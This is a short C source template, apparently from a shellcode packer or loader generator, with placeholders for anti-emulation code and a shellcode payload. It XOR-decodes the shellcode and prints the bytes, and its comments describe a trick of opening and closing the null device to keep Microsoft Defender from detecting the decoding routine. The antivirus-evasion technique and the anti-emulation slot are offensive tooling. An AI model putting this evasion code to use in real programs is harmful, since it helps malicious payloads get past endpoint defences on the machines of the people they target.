#include <windows.h>
#include <stdio.h>


void XOR(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
	// Defender will detect this function
	// Somehow, opening the null device and closing it again is enough to avoid detection
	FILE* outfile = fopen("nul", "w");
	
	int myByte = 0;
	int k_minus_one = key_len - 1;
	for (int idx = 0;  idx < ciphertext_len; idx++) {
		if (myByte == k_minus_one)
		{ 
			myByte = 0;
		}
		
		ciphertext[idx] = ciphertext[idx] ^ key[myByte];
		myByte++;

	}
	// Close our decoy
	fclose(outfile);
}


int main(void)
{
	{{ANTI_EMULATION}}
	{{SHELLCODE}}
	
	// XOR our shellcode with the key to decode it
	XOR((char *) shellcode, sizeof(shellcode), xorkey, sizeof(xorkey));
	
	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

	
	return 0;
}
